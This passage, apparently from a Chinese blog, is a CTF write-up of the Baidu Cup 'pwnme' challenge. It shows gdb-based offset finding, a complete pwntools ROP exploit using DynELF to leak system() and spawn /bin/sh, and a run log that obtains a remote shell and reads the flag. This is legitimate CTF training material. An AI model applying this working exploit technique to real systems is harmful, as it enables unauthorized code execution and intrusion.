+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="co">#调用DynElf遍历 </span></span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>d <span class="op">=</span> DynELF(loop, elf<span class="op">=</span>ELF(<span class="st">&#39;./pwnme&#39;</span>))</span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> d.lookup(<span class="st">&#39;system&#39;</span>, <span class="st">&#39;libc&#39;</span>)</span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> <span class="bu">hex</span>(system_addr)</span></code></pre></div>
+<p>接下来就是了解栈结构然后用栈溢出劫持控制流了
+我用的是IDA远程调试虚拟机找到栈结构确定是输入password
+40字节后是返回地址，你也可以利用<code>pattent.py</code>这个脚本配合<code>gdb</code>调试来寻找
+<code>gdb</code>具体步骤如下: 首先生成一个溢出的payload
+0x100-0x120均可(前面代码有分析为什么是这个长度)，在此我选择生成0x110即272长度的payload</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python pattern.py  create 272</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj</span></span></code></pre></div>
+<p>然后<code>gdb ./pwnme</code>调试程序</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> program: /home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme </span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">**********************************************</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>                                            <span class="pp">*</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>              Have fun!Pwn me               <span class="pp">*</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>                                            <span class="pp">*</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">**********************************************</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Register</span> Account first!</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Input</span> your username<span class="er">(</span><span class="ex">max</span> lenth:40<span class="kw">)</span><span class="bu">:</span> </span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">123</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Input</span> your password<span class="er">(</span><span class="ex">max</span> lenth:40<span class="kw">)</span><span class="bu">:</span> </span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">123</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Register</span> Success!!</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ex">1.Sh0w</span> Account Infomation!</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">2.Ed1t</span> Account Inf0mation!</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="ex">3.QUit</span> System:</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span>2</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="ex">please</span> input new username<span class="er">(</span><span class="ex">max</span> lenth:20<span class="kw">)</span><span class="bu">:</span> </span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="ex">123</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="ex">please</span> input new password<span class="er">(</span><span class="ex">max</span> lenth:20<span class="kw">)</span><span class="bu">:</span> </span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Program</span> received signal SIGSEGV, Segmentation fault.</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0000000000400ad0</span> in <span class="pp">??</span> <span class="er">(</span><span class="kw">)</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a><span class="ex">LEGEND:</span> STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a><span class="ex">[──────────────────────────────────REGISTERS───────────────────────────────────]</span></span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a><span class="ex">*RAX</span>  0x7fffffffde50 ◂— 0x6141316141306141 <span class="er">(</span><span class="st">&#39;Aa0Aa1Aa&#39;</span><span class="kw">)</span></span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a> <span class="ex">RBX</span>  0x0</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a><span class="ex">*RCX</span>  0x6038e0 ◂— 0x0</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a><span class="ex">*RDX</span>  0x10</span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a><span class="ex">*RDI</span>  0x7fffffffde50 ◂— 0x6141316141306141 <span class="er">(</span><span class="st">&#39;Aa0Aa1Aa&#39;</span><span class="kw">)</span></span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a><span class="ex">*RSI</span>  0x6038f0 ◂— 0x6141316141306141 <span class="er">(</span><span class="st">&#39;Aa0Aa1Aa&#39;</span><span class="kw">)</span></span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a><span class="ex">*R8</span>   0x1</span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a><span class="ex">*R9</span>   0x7fffffffde40 ◂— 0x111004010a8</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a><span class="ex">*R10</span>  0x603af0 ◂— 0x0</span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a><span class="ex">*R11</span>  0x7fffffffdf41 ◂— 0x3269413169413069 <span class="er">(</span><span class="st">&#39;i0Ai1Ai2&#39;</span><span class="kw">)</span></span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a><span class="ex">*R12</span>  0x400770 ◂— xor    ebp, ebp</span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a><span class="ex">*R13</span>  0x7fffffffe080 ◂— 0x1</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a> <span class="ex">R14</span>  0x0</span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a> <span class="ex">R15</span>  0x0</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a><span class="ex">*RBP</span>  0x4132624131624130 <span class="er">(</span><span class="st">&#39;0Ab1Ab2A&#39;</span><span class="kw">)</span></span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a><span class="ex">*RSP</span>  0x7fffffffde78 ◂— 0x3562413462413362 <span class="er">(</span><span class="st">&#39;b3Ab4Ab5&#39;</span><span class="kw">)</span></span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a><span class="ex">*RIP</span>  0x400ad0 ◂— ret    </span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a><span class="ex">[────────────────────────────────────DISASM────────────────────────────────────]</span></span>
+<span id="cb7-45"><a href="#cb7-45" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 0x400ad0    ret    <span class="op">&lt;</span>0x3562413462413362<span class="op">&gt;</span></span></code></pre></div>
+<p>可以看到在内存地址<code>0x3562413462413362</code>发生了段错误，然后我们用<code>pattent.py</code>寻找位移得知位移为<code>40 Bytes</code>
+(我的gdb装了pwnbdg插件所以会跟一般的gdb显示不同，pwndbg在github上有)</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python pattern.py  offset 0x3562413462413362</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">hex</span> pattern decoded as: b3Ab4Ab5</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">40</span></span></code></pre></div>
+<p>然后我们就可以在填充了40个字节的数据之后填上我们的劫持地址了</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co">#exploit</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="co">#修改名字随便</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&#39;&gt;&#39;</span>,<span class="st">&#39;2&#39;</span>)</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&#39;please input new username(max lenth:20): </span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="st">&#39;123&#39;</span>)</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="co">#找到一个pop几个参数进rsi,rdi,rdx供read使用</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="co">#rbx和rbp是为了call之后代码继续执行会进行一个add rbx, 1;cmp rbx, rbp ;jnz back;</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="co">#所以我们将0 pop 给rbx 将 1 pop 给 rbp 给它继续执行下去</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="co">#0x400eca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="co">#0x400eb0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>pop_6_ret <span class="op">=</span> <span class="bn">0x400eca</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>call_address <span class="op">=</span> <span class="bn">0x400eb0</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>pop_rdi_ret <span class="op">=</span> <span class="bn">0x400ed3</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>read_got <span class="op">=</span> <span class="bn">0x601FC8</span><span class="co">#read之前已经调用，直接读取got就好了</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a><span class="co">#.bss</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> <span class="bn">0x602010</span></span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="co">#first ret address is 40 bytes</span></span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span>  <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">40</span></span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="co">#pop 进寄存器</span></span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>  p64(pop_6_ret)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(read_got)<span class="op">+</span>p64(<span class="dv">8</span>)<span class="op">+</span>p64(bin_sh_addr)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="co">#作用就是劫持控制流到pop_6_ret处执行，然后分别pop 0-&gt;rbx ; pop 1-&gt;rbp ;pop read_got -&gt;r13;pop 8 -&gt;r14  ;pop 1-&gt;r15 ;对应下一个gadget的mov给read三个传参</span></span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="co"># call read</span></span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a> <span class="co">#7个0x1对应call之后的7个pop，无关紧要，我们只想要ret，实在不理解可以看IDA</span></span>
+<span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(call_address)<span class="op">+</span>p64(<span class="bn">0x1</span>)<span class="op">*</span><span class="dv">7</span> </span>
+<span id="cb9-23"><a href="#cb9-23" aria-hidden="true" tabindex="-1"></a><span class="co">#最后起shell</span></span>
+<span id="cb9-24"><a href="#cb9-24" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(pop_rdi_ret) <span class="op">+</span> p64(bin_sh_addr) <span class="op">+</span> p64(system_addr)</span>
+<span id="cb9-25"><a href="#cb9-25" aria-hidden="true" tabindex="-1"></a><span class="co">#在payload后面填充字符&#39;0&#39;至长度为0x110</span></span>
+<span id="cb9-26"><a href="#cb9-26" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> payload.ljust(<span class="bn">0x110</span>,<span class="st">&#39;0&#39;</span>)</span>
+<span id="cb9-27"><a href="#cb9-27" aria-hidden="true" tabindex="-1"></a><span class="co">#发送padload</span></span>
+<span id="cb9-28"><a href="#cb9-28" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&#39;please input new password(max lenth:20): </span><span class="ch">\n</span><span class="st">&#39;</span>,payload)</span>
+<span id="cb9-29"><a href="#cb9-29" aria-hidden="true" tabindex="-1"></a>pro.send(<span class="st">&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="co">#将字符串&#39;/bin/sh\x00&#39;读入缓冲区</span></span>
+<span id="cb9-30"><a href="#cb9-30" aria-hidden="true" tabindex="-1"></a>pro.interactive()<span class="co">#开启交互</span></span></code></pre></div>
+<p>至此就可以得到shell了 运行脚本</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python test.py </span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Opening connection to 106.75.66.195 on port 13002: Done</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme&#39;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     amd64-64-little</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    Full RELRO</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    No canary found</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX enabled</span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x400000</span><span class="kw">)</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Loading from <span class="st">&#39;/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme&#39;</span>: 0x7f3cefbef150</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Resolving <span class="st">&#39;system&#39;</span> in <span class="st">&#39;libc.so&#39;</span>: 0x7f3cefbef150</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[!]</span> No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> No linkmap found</span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> .gnu.hash/.hash, .strtab and .symtab offsets</span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Found DT_GNU_HASH at 0x7f3cef9c4be0</span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Found DT_STRTAB at 0x7f3cef9c4bf0</span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Found DT_SYMTAB at 0x7f3cef9c4c00</span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> .gnu.hash parms</span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> hash chain index</span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> hash chain</span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7f3cef64b020</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Switching to interactive mode</span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> id</span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1009<span class="kw">(</span><span class="ex">pwnme</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1009<span class="kw">(</span><span class="ex">pwnme</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1009<span class="kw">(</span><span class="ex">pwnme</span><span class="kw">)</span></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat /home/pwnme/flag.txt</span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a><span class="ex">flag&#123;ecfdbab646c8539f75078b76216942ef&#125;</span></span></code></pre></div>
+<h4 id="总结">总结</h4>
+<blockquote>
+<ol type="1">
+<li>耗时很久，需要掌握的东西略多</li>
+<li>linux 32和64位差异不了解</li>
+<li>二进制工具不熟悉,linux调试短板</li>
+<li>劳累、耗时程度与成就感成正比</li>
+</ol>
+</blockquote>
+<h4 id="参考文献"><strong>参考文献</strong></h4>
+<p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-6597.html">一步一步学ROP之linux_x86篇
+- 蒸米</a></p>
+<p><a target="_blank" rel="noopener" href="http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html">一步一步学ROP之linux_x64篇
+- 蒸米</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html">CTF
+Wiki - 格式化字符串漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.mottoin.com/92467.html">百度杯十一月场pwn专题赛—pwnme
+writeup - Moto</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-16508-1-1.html">百度杯CTF·十二月PWN专题WriteUp解析
+- 一口盐汽水</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85129">借助DynELF实现无libc的漏洞利用小结
+- tianyi201612</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/qq_15514565/article/details/57644132">IA32寄存器与x86-64寄存器的区别
+- 转载</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-1990426.html">二进制的保护机制</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://testzero-wz.github.io/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/">https://testzero-wz.github.io/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/blog/tag/CTF/"># CTF</a>
+                    
+                        <a href="/blog/tag/%E4%BA%8C%E8%BF%9B%E5%88%B6/"># 二进制</a>
+                    
+                        <a href="/blog/tag/PWN/"># PWN</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/blog/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/blog/2018/01/16/PythonGUI%E6%A8%A1%E6%8B%9FTCP%EF%BC%8FIP%E8%A7%A3%E3%80%81%E5%B0%81%E5%8C%85/">PythonGUI模拟TCP／IP解、封包</a>
+            
+            
+            <a class="next" rel="next" href="/blog/2017/11/20/2017-LCTF-use_your_IDA/">2017-LCTF-use_your_IDA解析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+    </div>
+</body>
+</html>
